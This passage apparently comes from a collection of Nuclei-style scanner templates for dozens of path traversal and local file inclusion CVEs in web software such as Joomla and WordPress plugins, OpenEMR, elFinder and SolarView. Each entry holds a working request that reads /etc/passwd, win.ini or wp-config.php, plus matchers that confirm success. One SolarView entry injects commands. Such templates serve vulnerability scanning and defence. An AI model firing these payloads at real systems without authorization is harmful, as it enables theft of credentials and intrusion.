- {{BaseURL}}/source/loggin/page_log_dwn_file.hsp?h=44ea8a6603cbf54e245f37b4ddaf8f36&action=download&fileName=..\..\..\windows\win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# OpenEMR 4.1 - Local File Inclusion

## Description

- Multiple directory traversal vulnerabilities in OpenEMR 4.1.0 allow remote authenticated users to read arbitrary files via a .. (dot dot) in the formname parameter to (1) contrib/acog/print_form.php; or (2) load_form.php, (3) view_form.php, or (4) trend_form.php in interface/patient_file/encounter.
- severity - high
- tags - lfi,openemr,traversal,edb,cve,cve2012

## Requests

- Method - GET

### URL

- {{BaseURL}}/contrib/acog/print_form.php?formname=../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# 11in1 CMS 1.2.1 - Local File Inclusion (LFI)

## Description

- Multiple directory traversal vulnerabilities in 11in1 1.2.1 stable 12-31-2011 allow remote attackers to read arbitrary files via a .. (dot dot) in the class parameter to (1) index.php or (2) admin/index.php.
- severity - high
- tags - cve,cve2012,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?class=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Dolibarr ERP/CRM 3.2 Alpha - Multiple Directory Traversal Vulnerabilities

## Description

- Multiple directory traversal vulnerabilities in Dolibarr CMS 3.2.0 Alpha allow remote attackers to read arbitrary files and possibly execute arbitrary code via a .. (dot dot) in the (1) file parameter to document.php or (2) backtopage parameter in a create action to comm/action/fiche.php.
- severity - high
- tags - cve,cve2012,lfi,dolibarr,traversal,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/document.php?modulepart=project&file=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# phpShowtime 2.0 - Directory Traversal

## Description

- A directory traversal vulnerability in phpShowtime 2.0 allows remote attackers to list arbitrary directories and image files via a .. (dot dot) in the r parameter to index.php.
- severity - high
- tags - phpshowtime,edb,cve,cve2012,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?r=i/../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# MySQLDumper 1.24.4 - Directory Traversal

## Description

- Multiple directory traversal vulnerabilities in MySQLDumper 1.24.4 allow remote attackers to read arbitrary files via a .. (dot dot) in the (1) language parameter to learn/cubemail/install.php or (2) f parameter learn/cubemail/filemanagement.php, or execute arbitrary local files via a .. (dot dot) in the (3) config parameter to learn/cubemail/menu.php.
- severity - high
- tags - packetstorm,cve,cve2012,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/learn/cubemail/filemanagement.php?action=dl&f=../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Count Per Day \<= 3.1 - download.php f Parameter Traversal Arbitrary File Access

## Description

- An absolute path traversal vulnerability in download.php in the Count Per Day module before 3.1.1 for WordPress allows remote attackers to read arbitrary files via the f parameter.
- severity - high
- tags - packetstorm,cve,cve2012,lfi,wordpress,wp-plugin,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# FlatnuX CMS - Directory Traversal

## Description

- A path traversal vulnerability in controlcenter.php in FlatnuX CMS 2011 08.09.2 allows remote administrators to read arbitrary files via a full pathname in the dir parameter in a contents/Files action.
- severity - high
- tags - cve2012,lfi,traversal,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# AVEVA InTouch Access Anywhere Secure Gateway - Path Traversal

## Description

- AVEVA Group plc is a marine and plant engineering IT company headquartered in Cambridge, England. AVEVA software is used in many sectors, including on- and off-shore oil and gas processing, chemicals, pharmaceuticals, nuclear and conventional power generation, nuclear fuel reprocessing, recycling and shipbuilding (https://www.aveva.com).

- severity - high
- tags - lfi,packetstorm,cve,cve2022,aveva,intouch

## Requests

- Method - GET

### URL

- {{BaseURL}}/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini

### Matchers

**Type - word**

- words
  1. for 16-bit app support
  2. extensions
- condition - and

**Type - word**

- part - header
- words
  1. EricomSecureGateway

**Type - status**

- status
  1. 200

---

# elFinder \<=2.1.60 - Local File Inclusion

## Description

- elFinder through 2.1.60 is affected by local file inclusion via connector.minimal.php. This allows unauthenticated remote attackers to read, write, and browse files outside the configured document root. This is due to improper handling of absolute file paths.

- severity - critical
- tags - cve,cve2022,lfi,elfinder

## Requests

### Step - 1

```
GET /elfinder/php/connector.minimal.php?cmd=file&target=l1_\<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd\<@/base64>&download=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WordPress Videos sync PDF \<=1.7.4 - Local File Inclusion

## Description

- WordPress Videos sync PDF 1.7.4 and prior does not validate the p parameter before using it in an include statement, which could lead to local file inclusion.
- severity - high
- tags - lfi,wp-plugin,unauth,wpscan,cve,cve2022,packetstorm,wp,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=tout

### Matchers

**Type - word**

- part - body
- words
  1. failed to open stream: No such file or directory
  2. REPERTOIRE_VIDEOSYNCPDFreglages/Menu_Plugins/tout.php
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress WPvivid Backup \< 0.9.76 - Local File Inclusion

## Description

- The plugin does not sanitise and validate a parameter before using it to read the content of a file, allowing high privilege users to read any file from the web server via a Traversal attack.
- severity - medium
- tags - wp,wpscan,seclists,packetstorm,authenticated,cve,cve2022,lfi,wordpress,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=WPvivid HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET /wp-admin/admin-ajax.php?_wpnonce={{nonce}}&action=wpvivid_download_export_backup&file_name=../../../../../../../etc/passwd&file_size=922 HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}/wp-admin/admin.php?page=WPvivid

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - nonce
- part - body
- group - 1
- regex
  1. "\_ajax_nonce":"([0-9a-z]+)"
- internal - True

---

# CuppaCMS v1.0 - Local File Inclusion

## Description

- Cuppa CMS v1.0 was discovered to contain a local file inclusion (LFI) vulnerability via the component /templates/default/html/windows/right.php.

- severity - high
- tags - cve,cve2022,lfi,cuppa,cms

## Requests

### Step - 1

```
POST /templates/default/html/windows/right.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

url=../../../../../../../../../../../../etc/passwd

```

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# QNAP QTS Photo Station External Reference

## Description

- An externally controlled reference to a resource vulnerability has been reported to affect QNAP NAS running Photo Station. If exploited, This could allow an attacker to modify system files. We have already fixed the vulnerability in the following versions: QTS 5.0.1: Photo Station 6.1.2 and later QTS 5.0.0/4.5.x: Photo Station 6.0.22 and later QTS 4.3.6: Photo Station 5.7.18 and later QTS 4.3.3: Photo Station 5.4.15 and later QTS 4.2.6: Photo Station 5.2.14 and later

- severity - critical
- tags - cve,cve2022,qnap,lfi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php.

### Matchers

**Type - word**

- part - response
- words
  1. !function(p,qa){
  2. module.exports
  3. application/javascript
- condition - and

**Type - status**

- status
  1. 200

---

# Barco Control Room Management Suite \<=2.9 Build 0275 - Local File Inclusion

## Description

- Barco Control Room Management through Suite 2.9 Build 0275 is vulnerable to local file inclusion that could allow attackers to access sensitive information and components. Requests must begin with the "GET /..\.." substring.
- severity - high
- tags - cve,cve2022,barco,lfi,seclists,packetstorm

## Requests

### Step - 1

```
GET /..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
Host: {{Hostname}}


```

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Razer Sila Gaming Router 2.0.441_api-2.0.418 - Local File Inclusion

## Description

- Razer Sila Gaming Router 2.0.441_api-2.0.418 is vulnerable to local file inclusion which could allow attackers to read arbitrary files.
- severity - high
- tags - cve,cve2022,razer,lfi,router,edb

## Requests

### Step - 1

```
POST /ubus/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

{"jsonrpc":"2.0","id":3,"method":"call","params":["4183f72884a98d7952d953dd9439a1d1","file","read",{"path":"/etc/passwd"}]}

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WordPress Cab fare calculator \< 1.0.4 - Local File Inclusion

## Description

- The Cab fare calculator WordPress plugin before 1.0.4 does not validate the controller parameter before using it in require statements, which could lead to Local File Inclusion issues.

- severity - critical
- tags - cve2022,wordpress,wp-plugin,lfi,wp,edb,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# DVDFab 12 Player/PlayerFab - Local File Inclusion

## Description

- DVDFab 12 Player/PlayerFab is susceptible to local file inclusion which allows a remote attacker to download any file on the Windows file system for which the user account running DVDFab 12 Player (recently renamed PlayerFab) has read-access.
- severity - high
- tags - cve,cve2022,dvdFab,lfi,lfr,tenable

## Requests

- Method - GET

### URL

- {{BaseURL}}/download/C%3a%2fwindows%2fsystem.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - status**

- status
  1. 200

---

# uDraw \<3.3.3 - Local File Inclusion

## Description

- uDraw before 3.3.3 does not validate the url parameter in its udraw_convert_url_to_base64 AJAX action (available to both unauthenticated and authenticated users) before using it in the file_get_contents function and returning its content base64 encoded in the response. As a result, unauthenticated users could read arbitrary files on the web server (such as /etc/passwd, wp-config.php etc).
- severity - high
- tags - wp,wordpress,wp-plugin,unauth,cve,cve2022,lfi,udraw,wpscan

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

action=udraw_convert_url_to_base64&url=/etc/passwd

```

### Matchers

**Type - word**

- words
  1. cm9vd
  2. data:image\/;base64
- condition - and

**Type - status**

- status
  1. 200

---

# UniSharp aka Laravel Filemanager v2.5.1 - Directory Traversal

## Description

- UniSharp laravel-filemanager (aka Laravel Filemanager) through 2.5.1 allows download?working_dir=%2F.. directory traversal to read arbitrary files.

- severity - medium
- tags - cve,cve2022,laravel,unisharp,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
- {{BaseURL}}/laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

---

# WordPress Admin Word Count Column 2.2 - Local File Inclusion

## Description

- The plugin does not validate the path parameter given to readfile(), which could allow unauthenticated attackers to read arbitrary files on server running old version of PHP susceptible to the null byte technique. This could also lead to RCE by using a Phar Deserialization technique.

- severity - critical
- tags - packetstorm,wpscan,cve,cve2022,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\0

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# BigAnt Server v5.6.06 - Local File Inclusion

## Description

- BigAnt Server v5.6.06 is vulnerable to local file inclusion.
- severity - high
- tags - cve,cve2022,bigant,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini&file_name=win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - status**

- status
  1. 200

---

# Portal do Software Publico Brasileiro i3geo 7.0.5 - Local File Inclusion

## Description

- Portal do Software Publico Brasileiro i3geo 7.0.5 is vulnerable to local file inclusion in the component codemirror.php, which allows attackers to execute arbitrary PHP code via a crafted HTTP request.
- severity - critical
- tags - cve,cve2022,i3geo,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Gitblit 1.9.3 - Local File Inclusion

## Description

- Gitblit 1.9.3 is vulnerable to local file inclusion via /resources//../ (e.g., followed by a WEB-INF or META-INF pathname).

- severity - high
- tags - cve,cve2022,lfi,gitblit

## Requests

- Method - GET

### URL

- {{BaseURL}}/resources//../WEB-INF/web.xml

### Matchers

**Type - word**

- part - body
- words
  1. \</web-app>
  2. java.sun.com
  3. gitblit.properties
- condition - and

**Type - word**

- part - header
- words
  1. application/xml

**Type - status**

- status
  1. 200

---

# Welcart eCommerce \<= 2.7.7 - Unauth Directory Traversal

## Description

- Unauth. Directory Traversal vulnerability in Welcart eCommerce plugin \<= 2.7.7 on WordPress.

- severity - critical
- tags - cve,cve2022,wp-plugin,wordpress,wp,lfi,unauth,usc-e-shop

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# WordPress Simple File List \<3.2.8 - Local File Inclusion

## Description

- WordPress Simple File List before 3.2.8 is vulnerable to local file inclusion via the eeFile parameter in the ~/includes/ee-downloader.php due to missing controls which make it possible for unauthenticated attackers retrieve arbitrary files.

- severity - high
- tags - wp,wp-plugin,wpscan,cve,cve2022,lfi,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Piano LED Visualizer 1.3 - Local File Inclusion

## Description

- Piano LED Visualizer 1.3 and prior are vulnerable to local file inclusion.

- severity - high
- tags - cve,cve2022,lfi,piano,iot,oss

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/change_setting?second_value=no_reload&disable_sequence=true&value=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# SolarView Compact 6.00 - Local File Inclusion

## Description

- SolarView Compact 6.00 is vulnerable to local file inclusion which could allow attackers to access sensitive files.
- severity - high
- tags - lfi,solarview,edb,cve,cve2022

## Requests

- Method - GET

### URL

- {{BaseURL}}/downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Oracle WebLogic Server Local File Inclusion

## Description

- An easily exploitable local file inclusion vulnerability allows unauthenticated attackers with network access via HTTP to compromise Oracle WebLogic Server. Supported versions that are affected are 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Successful attacks of this vulnerability can result in unauthorized and sometimes complete access to critical data.
- severity - high
- tags - cve,cve2022,lfi,weblogic,oracle

## Requests

- Method - GET

### Matchers

**Type - dsl**

- dsl
  1. contains(body, "\<web-app") && contains(body, "\</web-app>")
  2. contains(body, "\<weblogic-web-app") && contains(body, "\</weblogic-web-app>")
- condition - or

**Type - dsl**

- dsl
  1. contains(all_headers, "text/xml")
  2. contains(all_headers, "application/xml")
- condition - or

**Type - status**

- status
  1. 200

### Step - 1

```
GET {{path}} HTTP/1.1
Host: {{Hostname}}


```

### Matchers

**Type - dsl**

- dsl
  1. contains(body, "\<web-app") && contains(body, "\</web-app>")
  2. contains(body, "\<weblogic-web-app") && contains(body, "\</weblogic-web-app>")
- condition - or

**Type - dsl**

- dsl
  1. contains(all_headers, "text/xml")
  2. contains(all_headers, "application/xml")
- condition - or

**Type - status**

- status
  1. 200

**Payloads**- path

---

# Shirne CMS 1.2.0. - Path Traversal

## Description

- Shirne CMS 1.2.0 There is a Path Traversal vulnerability which could cause arbitrary file read via /static/ueditor/php/controller.php
- severity - medium
- tags - cve,cve2022,shirnecms,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/static/ueditor/php/controller.php?action=proxy&remote=php://filter/convert.base64-encode/resource=/etc/passwd&maxwidth=-1&referer=test

### Matchers

**Type - word**

- part - body
- words
  1. cm9vd

**Type - word**

- part - header
- words
  1. image/png

**Type - status**

- status
  1. 200

---

# WordPress Narnoo Distributor \<=2.5.1 - Local File Inclusion

## Description

- WordPress Narnoo Distributor plugin 2.5.1 and prior is susceptible to local file inclusion. The plugin does not validate and sanitize the lib_path parameter before being passed into a call to require() via the narnoo_distributor_lib_request AJAX action, and the content of the file is displayed in the response as JSON data. This can also lead to a remote code execution vulnerability depending on system and configuration.

- severity - critical
- tags - narnoo-distributor,cve,cve2022,wordpress,wp-plugin,wpscan,wp,rce,unauth,lfi

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

action=narnoo_distributor_lib_request&lib_path=/etc/passwd

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# muhttpd \<= 1.1.5 - Path traversal

## Description

- A Path traversal vulnerability exists in versions muhttpd 1.1.5 and earlier. The vulnerability is directly requestable to files within the file system.

- severity - high
- tags - cve,cve2022,network,muhttpd,lfi,unauth

---

# Zaver - Local File Inclusion

## Description

- Zaver through 2020-12-15 allows directory traversal via the GET /.. substring.

- severity - high
- tags - cve,cve2022,lfi,zaver

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# BackupBuddy - Local File Inclusion

## Description

- BackupBuddy versions 8.5.8.0 - 8.7.4.1 are vulnerable to a local file inclusion vulnerability via the 'download' and 'local-destination-id' parameters.
- severity - high
- tags - cve,cve2022,wordpress,wp-plugin,wp,lfi,backupbuddy

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# VMware - Authentication Bypass

## Description

- VMware Workspace ONE Access, Identity Manager and vRealize Automation contain an authentication bypass vulnerability affecting local domain users. A malicious actor with network access to the UI may be able to obtain administrative access without the need to authenticate.

- severity - critical
- tags - cve,cve2022,vmware,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/SAAS/t/\_/;/WEB-INF/web.xml

### Matchers

**Type - word**

- part - body
- words
  1. \<web-app
  2. \<servlet-name>
- condition - and

**Type - word**

- part - header
- words
  1. application/xml

**Type - status**

- status
  1. 200

---

# Omnia MPX 1.5.0+r1 - Path Traversal

## Description

- A local file disclosure vulnerability in /appConfig/userDB.json of Telos Alliance Omnia MPX Node through 1.5.0+r1 allows attackers to escalate privileges to root and execute arbitrary commands.

- severity - critical
- tags - traversal,omnia,edb,cve,cve2022,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd
- {{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - word**

- part - body
- words
  1. "username":
  2. "password":
  3. "mustChangePwd":
  4. "roleUser":
- condition - and

---

# SolarView 6.00 - Remote Command Execution

## Description

- SolarView Compact 6.00 was discovered to contain a command injection vulnerability via network_test.php

- severity - critical
- tags - cve,cve2022,solarview,rce,lfi

## Requests

### Step - 1

```
POST /network_test.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

host=%0a{{cmd}}%0a&command=ping

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Cisco Linksys WVC54GCA 1.00R22/1.00R24 - Local File Inclusion

## Description

- Cisco Linksys WVC54GCA 1.00R22/1.00R24 is susceptible to local file inclusion in adm/file.cgi because it allows remote attackers to read arbitrary files via a %2e. (encoded dot dot) or an absolute pathname in the next_file parameter.
- severity - high
- tags - cve,iot,linksys,camera,traversal,cve2009,lfi,cisco,firmware,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/adm/file.cgi?next_file=%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Roland Breedveld Album 1.14 - Local File Inclusion

## Description

- Joomla! Roland Breedveld Album 1.14 (com_album) is susceptible to local file inclusion because it allows remote attackers to access arbitrary directories and have unspecified other impact via a .. (dot dot) in the target parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,cve,cve2009

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_album&Itemid=128&target=../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! MooFAQ 1.0 - Local File Inclusion

## Description

- Joomla! Ideal MooFAQ 1.0 via com_moofaq allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter (local file inclusion).
- severity - high
- tags - joomla,lfi,edb,cve,cve2009

## Requests

- Method - GET

### URL

- {{BaseURL}}/components/com_moofaq/includes/file_includer.php?gzip=0&file=/../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Omilen Photo Gallery 0.5b - Local File Inclusion

## Description

- Joomla! Omilen Photo Gallery (com_omphotogallery) component Beta 0.5 allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the controller parameter to index.php.
- severity - high
- tags - cve2009,joomla,lfi,photo,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_omphotogallery&controller=../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Horde/Horde Groupware - Local File Inclusion

## Description

- Horde before 3.2.4 and 3.3.3 and Horde Groupware before 1.1.5 are susceptible to local file inclusion in framework/Image/Image.php because it allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the Horde_Image driver name.
- severity - high
- tags - cve,cve2009,horde,lfi,traversal,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Cmimarketplace 0.1 - Local File Inclusion

## Description

- Joomla! Cmimarketplace 0.1 is susceptible to local file inclusion because com_cmimarketplace allows remote attackers to list arbitrary directories via a .. (dot dot) in the viewit parameter to index.php.

- severity - high
- tags - joomla,lfi,edb,cve,cve2009

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_cmimarketplace&Itemid=70&viewit=/../../../../../../etc/passwd&cid=1

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Agora 3.0.0b - Local File Inclusion

## Description

- Joomla! Agora 3.0.0b (com_agora) allows remote attackers to include and execute arbitrary local files via local file inclusion in the action parameter to the avatars page, reachable through index.php.
- severity - high
- tags - cve,cve2009,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_agora&task=profile&page=avatars&action=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WebGlimpse 2.18.7 - Directory Traversal

## Description

- A directory traversal vulnerability in wgarcmin.cgi in WebGlimpse 2.18.7 and earlier allows remote attackers to read arbitrary files via a .. (dot dot) in the DOC parameter.
- severity - high
- tags - edb,cve,cve2009,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! JoomlaPraise Projectfork 2.0.10 - Local File Inclusion

## Description

- Joomla! JoomlaPraise Projectfork (com_projectfork) 2.0.10 allows remote attackers to read arbitrary files via local file inclusion in the section parameter to index.php.
- severity - high
- tags - cve,cve2009,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_projectfork&section=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Portfolio Nexus - Remote File Inclusion

## Description

- Joomla! Portfolio Nexus 1.5 contains a remote file inclusion vulnerability in the inertialFATE iF (com_if_nexus) component that allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.

- severity - high
- tags - cve,cve2009,joomla,lfi,nexus,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Squirrelmail \<=1.4.6 - Local File Inclusion

## Description

- SquirrelMail 1.4.6 and earlier versions are susceptible to a PHP local file inclusion vulnerability in functions/plugin.php if register_globals is enabled and magic_quotes_gpc is disabled. This allows remote attackers to execute arbitrary PHP code via a URL in the plugins array parameter.
- severity - high
- tags - cve,cve2006,lfi,squirrelmail,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/src/redirect.php?plugins[]=../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Joomla! Helpdesk Pro plugin \<1.4.0 - Local File Inclusion

## Description

- Directory traversal vulnerability in the Helpdesk Pro plugin before 1.4.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the filename parameter in a ticket.download_attachment task.
- severity - high
- tags - lfi,packetstorm,edb,cve,cve2015,joomla,plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/?option=com_helpdeskpro&task=ticket.download_attachment&filename=/../../../../../../../../../../../../etc/passwd&original_filename=AnyFileName.exe

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Slider Revolution - Local File Disclosure

## Description

- Directory traversal vulnerability in the Elegant Themes Divi theme for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the img parameter in a revslider_show_image action to wp-admin/admin-ajax.php. NOTE: this vulnerability may be a duplicate of CVE-2014-9734.

- severity - high
- tags - wordpress,wp-plugin,lfi,revslider,wp,wpscan,cve,cve2015

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
- {{BaseURL}}/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. 'DB_NAME'
  2. 'DB_PASSWORD'
  3. 'DB_USER'
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Zip Attachments \<= 1.1.4 - Arbitrary File Retrieval

## Description

- WordPress zip-attachments plugin allows arbitrary file retrieval as it does not check the download path of the requested file.
- severity - high
- tags - cve2015,wp-plugin,wpscan,lfi,wordpress,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/zip-attachments/download.php?za_file=../../../../../etc/passwd&za_filename=passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Geddy \<13.0.8 - Local File Inclusion

## Description

- Geddy prior to version 13.0.8 contains a directory traversal vulnerability in lib/app/index.js that allows remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the PATH_INFO to the default URI.
- severity - high
- tags - cve,cve2015,geddy,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

### Matchers

**Type - regex**

- regex
